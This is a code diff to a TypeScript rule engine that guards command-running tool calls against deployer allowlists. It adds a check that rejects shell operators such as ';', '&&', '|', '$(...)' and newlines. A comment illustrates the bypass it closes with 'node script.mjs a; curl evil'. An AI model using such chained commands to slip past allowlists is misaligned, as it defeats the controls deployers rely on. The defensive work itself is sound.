@@ -31,6 +31,15 @@ export interface GuardRule {
   readonly commandField?: string
   /** Regular expressions; a command matching none of them is denied. */
   readonly allowCommands?: string[]
+  /**
+   * Permit shell operators in an allowlisted command. Off by default.
+   *
+   * An allowlist pattern anchors the head of the command; `;`, `&&`, `|` and
+   * `$(...)` all let a second command ride along behind one that matched. Every
+   * deployment writing an allowlist has to defend against this, so the check
+   * belongs here rather than in each of their regular expressions.
+   */
+  readonly allowShellOperators?: boolean
   readonly arguments?: Record<string, ArgumentConstraint>
   /** Model-facing denial reason that replaces the generated one. */
   readonly deny?: string
@@ -68,6 +77,7 @@ interface CompiledRule {
   readonly requireScopes: readonly string[]
   readonly commandField: string
   readonly allowCommands: readonly RegExp[]
+  readonly allowShellOperators: boolean
   readonly argumentConstraints: readonly CompiledConstraint[]
   readonly deny: string | undefined
 }
@@ -83,6 +93,13 @@ const DEFAULT_COMMAND_FIELD = 'command'
 const DEFAULT_DENY_MESSAGE = '该工具未被部署方允许调用。'
 
 const REGEXP_METACHARACTERS = /[.+?^${}()|[\]\\]/g
+
+/**
+ * Shell constructs that chain, redirect or substitute a second command.
+ *
+ * Newlines count: a matched first line says nothing about the second.
+ */
+const SHELL_OPERATORS = /[;&|<>`\n\r]|\$\(/
 
 /**
  * Translate a tool-name glob into an anchored pattern.
@@ -139,6 +156,7 @@ function compileRule(rule: GuardRule, index: number): CompiledRule {
     commandField: rule.commandField?.trim() || DEFAULT_COMMAND_FIELD,
     allowCommands: (rule.allowCommands ?? [])
       .map((pattern, position) => compilePattern(pattern, `${at}.allowCommands[${position}]`)),
+    allowShellOperators: rule.allowShellOperators === true,
     argumentConstraints: Object.entries(rule.arguments ?? {})
       .map(([name, constraint]) => compileConstraint(name, constraint, `${at}.arguments.${name}`)),
     deny: rule.deny?.trim() || undefined,
@@ -210,6 +228,12 @@ function ruleProblem(rule: CompiledRule, execution: GuardedExecution, context: G
     // that never looked at anything — the one outcome an allowlist must not have.
     if (typeof command !== 'string' || command.trim().length === 0) {
       return rule.deny ?? `无法读取 ${execution.name} 的命令内容，出于安全已拒绝执行。`
+    }
+    // Check operators before the allowlist. `node script.mjs a; curl evil` matches
+    // a pattern anchored at `^node script\.mjs`, and the part that matched is not
+    // the part that runs second.
+    if (!rule.allowShellOperators && SHELL_OPERATORS.test(command)) {
+      return rule.deny ?? '命令中不允许出现 shell 操作符。'
     }
     if (!rule.allowCommands.some(pattern => pattern.test(command))) {
       return rule.deny ?? '该命令未被部署方允许执行。'
